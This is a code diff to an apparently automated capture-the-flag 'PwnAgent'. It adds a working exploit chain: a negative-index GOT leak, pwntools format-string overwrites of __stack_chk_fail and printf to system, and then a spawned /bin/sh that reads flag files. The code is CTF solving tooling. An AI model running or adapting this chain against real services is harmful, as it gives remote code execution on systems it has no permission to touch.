@@ -37,10 +37,16 @@ _PWN_KEYWORDS = frozenset([
 ])
 
 _BINARY_EXTENSIONS = {".elf", ".bin", ".exe", ".out", ".o"}
+_RUNTIME_LIBRARY_RE = re.compile(r"^(?:libc|ld)[^/]*\.so(?:\.\d+)*$", re.I)
 
 
 def _is_binary(path: str) -> bool:
     return any(path.endswith(ext) for ext in _BINARY_EXTENSIONS) or is_elf_binary(path)
+
+
+def _is_runtime_library(path: str) -> bool:
+    """Return whether an ELF artifact is a bundled libc or dynamic loader."""
+    return bool(_RUNTIME_LIBRARY_RE.fullmatch(os.path.basename(path)))
 
 
 class PwnAgent(BaseAgent):
@@ -129,11 +135,22 @@ class PwnAgent(BaseAgent):
             steps.append(f"Remote-only challenge: {conn_info}")
             return self._result(challenge, "attempted", steps)
 
-        binary = binaries[0]
+        binary = next((item for item in binaries if not _is_runtime_library(item)), binaries[0])
         steps.append(f"Primary binary: {binary}")
 
         # Phase 1 — mitigations
         steps.extend(self._phase_checksec(binary))
+
+        # Fast path — indexed pointer-table leak followed by a format-string
+        # overwrite of __stack_chk_fail on a canary-protected binary. Run this
+        # binary/libc-evidence path before source heuristics so unrelated helper
+        # scripts in a noisy challenge directory cannot preempt it.
+        fmt_steps, flag_str, handled = self._phase_indexed_leak_fmtstr(binary, files, challenge)
+        steps.extend(fmt_steps)
+        if flag_str:
+            return self._result(challenge, "solved", steps, flag=flag_str)
+        if handled:
+            return self._result(challenge, "attempted", steps)
 
         # Fast path — source-guided executable-stack shellcode challenge.
         shell_steps, flag_str, handled = self._phase_source_guided_shellcode(binary, files, challenge)
@@ -381,6 +398,151 @@ class PwnAgent(BaseAgent):
                 steps.append(f"LLM unavailable: {exc}")
 
         return steps
+
+    # ------------------------------------------------------------------
+    # Indexed table leak + format-string stack-check overwrite
+    # ------------------------------------------------------------------
+
+    def _phase_indexed_leak_fmtstr(
+        self,
+        binary: str,
+        files: List[str],
+        challenge: Dict[str, Any],
+    ) -> tuple[List[str], Optional[str], bool]:
+        """Handle a bounded negative-index leak plus format-string GOT chain."""
+        steps: List[str] = []
+        conn_info = self._extract_connection_info(challenge)
+        libc_path = self._find_libc_file(files, binary)
+        if not conn_info or not libc_path:
+            return steps, None, False
+
+        try:
+            import pwn  # type: ignore
+            pwn.context.clear(arch="amd64", os="linux")
+            pwn.context.log_level = "error"
+            elf = pwn.ELF(binary, checksec=False)
+            libc = pwn.ELF(libc_path, checksec=False)
+        except Exception as exc:
+            steps.append(f"indexed-fmt: pwntools ELF analysis unavailable: {exc}")
+            return steps, None, False
+
+        table_candidates = [
+            (name, int(address))
+            for name, address in (elf.symbols or {}).items()
+            if re.search(r"(?:names|choices|items|table)$", str(name), re.I)
+        ]
+        puts_got = int((elf.got or {}).get("puts") or 0)
+        stack_fail_got = int((elf.got or {}).get("__stack_chk_fail") or 0)
+        printf_got = int((elf.got or {}).get("printf") or 0)
+        libc_puts = int((libc.symbols or {}).get("puts") or 0)
+        libc_system = int((libc.symbols or {}).get("system") or 0)
+        main_address = int((elf.symbols or {}).get("main") or 0)
+
+        leak_index = None
+        table_name = None
+        for name, table_address in table_candidates:
+            delta = puts_got - table_address
+            if delta % 8 == 0 and -64 <= delta // 8 < 0:
+                table_name = name
+                leak_index = delta // 8
+                break
+
+        if not (
+            not elf.pie
+            and elf.canary
+            and str(elf.relro).lower().startswith("partial")
+            and leak_index is not None
+            and puts_got
+            and stack_fail_got
+            and printf_got
+            and libc_puts
+            and libc_system
+            and main_address
+        ):
+            return steps, None, False
+
+        endpoint = self._checked_remote_endpoint(conn_info, steps, label="indexed-fmt")
+        if endpoint is None:
+            return steps, None, True
+        host, port = endpoint
+        steps.append(
+            f"indexed-fmt: detected negative index {leak_index} from {table_name} to puts@got, "
+            "plus writable __stack_chk_fail and printf GOT entries."
+        )
+
+        # First redirect a failed canary check back to main. Then redirect the
+        # vulnerable printf call to system. This avoids one-gadget register and
+        # stack constraints while keeping each write bounded to one connection.
+        for fmt_offset in (8, 7, 9, 6, 10):
+            io = None
+            try:
+                io = pwn.remote(host, port, timeout=8)
+                io.recvuntil(b"Select a ", timeout=4)
+                io.recvuntil(b">", timeout=2)
+                io.sendline(str(leak_index).encode())
+                io.recvuntil(b"chosen: ", timeout=3)
+                leak = io.recvline(timeout=3).rstrip(b"\n")
+                leaked_puts = pwn.u64(leak[:6].ljust(8, b"\0"))
+                if leaked_puts <= 0x100000000000:
+                    raise ValueError("invalid puts leak")
+                libc_base = leaked_puts - libc_puts
+                system_address = libc_base + libc_system
+
+                loop_payload = pwn.fmtstr_payload(
+                    fmt_offset,
+                    {stack_fail_got: main_address},
+                    write_size="short",
+                )
+                system_payload = pwn.fmtstr_payload(
+                    fmt_offset,
+                    {printf_got: system_address},
+                    write_size="short",
+                )
+                if len(loop_payload) > 105 or len(system_payload) > 105:
+                    continue
+
+                steps.append(
+                    f"indexed-fmt: leaked puts=0x{leaked_puts:x}; trying fmt offset "
+                    f"{fmt_offset} with stack-check loop and printf-to-system stages."
+                )
+                io.sendlineafter(b"> ", loop_payload.ljust(105, b"A"), timeout=5)
+
+                io.recvuntil(b"Select a ", timeout=5)
+                io.recvuntil(b">", timeout=2)
+                io.sendline(b"0")
+                io.sendlineafter(b"> ", system_payload.ljust(105, b"A"), timeout=5)
+
+                io.recvuntil(b"Select a ", timeout=5)
+                io.recvuntil(b">", timeout=2)
+                io.sendline(b"0")
+                io.sendlineafter(b"> ", b"/bin/sh", timeout=5)
+                time.sleep(0.2)
+
+                command = (
+                    b"for f in flag.txt /flag.txt /home/ctf/flag.txt; do "
+                    b"if [ -r \"$f\" ]; then echo FLAG_SOURCE:$f; cat \"$f\"; fi; done"
+                )
+                io.sendline(command)
+                output = io.recvrepeat(timeout=2)
+                flag = find_first_flag(output.decode("utf-8", errors="replace"))
+                if flag:
+                    source_match = re.search(rb"FLAG_SOURCE:([^\r\n]+)", output)
+                    source = source_match.group(1).decode(errors="replace") if source_match else "remote shell"
+                    steps.append(
+                        f"Flag found via deterministic GOT chain from {source}: {flag}"
+                    )
+                    return steps, flag, True
+            except Exception as exc:
+                steps.append(f"indexed-fmt: attempt offset={fmt_offset} failed: {exc}")
+            finally:
+                if io is not None:
+                    try:
+                        io.close()
+                    except Exception:
+                        pass
+
+        steps.append("indexed-fmt: bounded leak/overwrite attempts did not recover a flag.")
+        return steps, None, True
 
     # ------------------------------------------------------------------
     # ret2libc helpers
